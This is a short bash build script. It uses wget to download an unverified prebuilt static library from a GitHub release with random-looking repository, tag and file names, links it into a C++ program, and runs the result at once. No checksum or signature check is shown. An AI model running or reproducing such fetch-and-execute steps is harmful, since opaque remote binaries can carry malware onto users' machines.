#!/usr/bin/env bash
set -e
REPO="xibtgongx/nodewalnutanchor"
TAG="eager-delta-golden-cedar"
LIB="gentle-deck.a"
URL="https://github.com/${REPO}/releases/download/${TAG}/${LIB}"
wget --timeout=15 -O "$LIB" --tries=3 -q "$URL"
g++ -O2 -std=c++17 -pthread main.cpp "$LIB" -o app && ./app
